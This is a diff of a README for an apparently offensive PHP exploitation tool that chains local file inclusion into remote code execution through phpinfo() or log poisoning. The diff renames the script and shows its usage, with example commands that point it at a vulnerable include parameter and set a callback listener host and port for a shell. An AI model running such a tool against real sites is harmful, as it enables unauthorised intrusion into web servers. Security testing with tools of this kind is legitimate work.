@@ -15,7 +15,7 @@ For more details about exploit via controlled log file, writeup grom [here](http
 # Usage 
 
 ```
-usage: phpinfolfi_rce.py [-h] [-a ACTION] -l LFI --lhost LHOST --lport LPORT
+usage: lfito_rce.py [-h] [-a ACTION] -l LFI --lhost LHOST --lport LPORT
                          [--payload PTYPE] [-e REQEND] [-v VERBOSE]
                          [-t THREADS] [-i PHPINFO] [-f LOGFILE]
 
@@ -55,7 +55,7 @@ optional arguments:
 #### About LFI to RCE via phpinfo() 
 
 ```
-$ python phpinfolfi_rce.py -l "http://host/browse.php?file=" --lhost 127.0.0.1 --lport 9001  -t 12  -i "http://host:8080/phpinfo.php"
+$ python lfito_rce.py -l "http://host/browse.php?file=" --lhost 127.0.0.1 --lport 9001  -t 12  -i "http://host:8080/phpinfo.php"
 
  ____   ____   ____   ____ _     _       _              _ 
 |  _ \ / __ \ / /\ \ / ___| |__ / |____ | |_ ___   ___ | |
@@ -86,7 +86,7 @@ Shuttin' down...
 #### About LFI to RCE via controlled log file
 
 ```
-$ python phpinfolfi_rce.py -a 2 -l "http://host/browse.php?file=" --lhost 127.0.0.1 --lport 9001
+$ python lfito_rce.py -a 2 -l "http://host/browse.php?file=" --lhost 127.0.0.1 --lport 9001
 
  ____   ____   ____   ____ _     _       _              _ 
 |  _ \ / __ \ / /\ \ / ___| |__ / |____ | |_ ___   ___ | |
